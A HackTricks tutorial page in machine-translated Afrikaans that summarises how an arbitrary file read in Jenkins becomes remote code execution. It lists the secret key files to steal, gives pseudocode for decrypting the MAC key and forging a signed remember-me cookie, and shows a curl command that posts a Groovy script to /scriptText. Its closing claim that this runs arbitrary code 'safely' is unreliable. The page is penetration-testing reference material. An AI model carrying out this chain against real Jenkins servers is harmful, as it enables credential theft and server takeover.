# Jenkins Arbitrary File Read to RCE via "Remember Me"

{% hint style="success" %}
Leer & oefen AWS Hacking:<img src="../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Leer & oefen GCP Hacking: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** üí¨ [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

In hierdie blogpos is dit moontlik om 'n wonderlike manier te vind om 'n Local File Inclusion kwesbaarheid in Jenkins in RCE te transformeer: [https://blog.securelayer7.net/spring-cloud-skipper-vulnerability/](https://blog.securelayer7.net/spring-cloud-skipper-vulnerability/)

Dit is 'n AI-gegenereerde opsomming van die deel van die pos waar die vervaardiging van 'n arbitr√™re koekie misbruik word om RCE te verkry deur 'n plaaslike l√™er te lees totdat ek tyd het om 'n opsomming op my eie te skep:

### Aanval Voorvereistes

* **Kenmerk Vereiste:** "Onthou my" moet geaktiveer wees (standaard instelling).
* **Toegangsvlakke:** Aanvaller benodig Algemene/Lees regte.
* **Geheime Toegang:** Vermo√´ om beide bin√™re en teksinhoud van sleutel l√™ers te lees.

### Gedetailleerde Exploitasiestap

#### Stap 1: Gegevensinsamelings

**Gebruikersinligting Herwinning**

* Toegang tot gebruikerskonfigurasie en geheime van `$JENKINS_HOME/users/*.xml` vir elke gebruiker om te versamel:
* **Gebruikersnaam**
* **Gebruikerssaad**
* **Tydstempel**
* **Wagwoord hash**

**Geheime Sleutel Uittrekking**

* Trek kriptografiese sleutels uit wat gebruik word om die koekie te teken:
* **Geheime Sleutel:** `$JENKINS_HOME/secret.key`
* **Meester Sleutel:** `$JENKINS_HOME/secrets/master.key`
* **MAC Sleutel L√™er:** `$JENKINS_HOME/secrets/org.springframework.security.web.authentication.rememberme.TokenBasedRememberMeServices.mac`

#### Stap 2: Koekie Vervalsing

**Token Voorbereiding**

*   **Bereken Token Vervaldatum:**

{% code overflow="wrap" %}
```javascript
tokenExpiryTime = currentServerTimeInMillis() + 3600000  // Voeg een uur by die huidige tyd
```
{% endcode %}
*   **Konkateer Gegevens vir Token:**

{% code overflow="wrap" %}
```javascript
token = username + ":" + tokenExpiryTime + ":" + userSeed + ":" + secretKey
```
{% endcode %}

**MAC Sleutel Ontsleuteling**

*   **Ontsleutel MAC Sleutel L√™er:**

```javascript
key = toAes128Key(masterKey)  // Convert meester sleutel na AES128 sleutel formaat
decrypted = AES.decrypt(macFile, key)  // Ontsleutel die .mac l√™er
if not decrypted.hasSuffix("::::MAGIC::::")
return ERROR;
macKey = decrypted.withoutSuffix("::::MAGIC::::")
```

**Handtekening Berekening**

*   **Bereken HMAC SHA256:**

```javascript
mac = HmacSHA256(token, macKey)  // Bereken HMAC met die token en MAC sleutel
tokenSignature = bytesToHexString(mac)  // Convert die MAC na 'n hexadesimale string
```

**Koekie Kodering**

*   **Genereer Finale Koekie:**

{% code overflow="wrap" %}
```javascript
cookie = base64.encode(username + ":" + tokenExpiryTime + ":" + tokenSignature)  // Base64 kodeer die koekie data
```
{% endcode %}

#### Stap 3: Kode Uitvoering

**Sessie Verifikasie**

* **Haal CSRF en Sessie Tokens:**
* Maak 'n versoek na `/crumbIssuer/api/json` om `Jenkins-Crumb` te verkry.
* Vang `JSESSIONID` uit die antwoord, wat saam met die onthou-my koekie gebruik sal word.

**Opdrag Uitvoeringsversoek**

*   **Stuur 'n POST Versoek met Groovy Skrip:**

```bash
curl -X POST "$JENKINS_URL/scriptText" \
--cookie "remember-me=$REMEMBER_ME_COOKIE; JSESSIONID...=$JSESSIONID" \
--header "Jenkins-Crumb: $CRUMB" \
--header "Content-Type: application/x-www-form-urlencoded" \
--data-urlencode "script=$SCRIPT"
```

* Groovy skrip kan gebruik word om stelselniveau opdragte of ander operasies binne die Jenkins omgewing uit te voer.

Die voorbeeld curl opdrag wat verskaf word demonstreer hoe om 'n versoek aan Jenkins te maak met die nodige koptekste en koekies om arbitr√™re kode veilig uit te voer.

{% hint style="success" %}
Leer & oefen AWS Hacking:<img src="../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Leer & oefen GCP Hacking: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** üí¨ [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
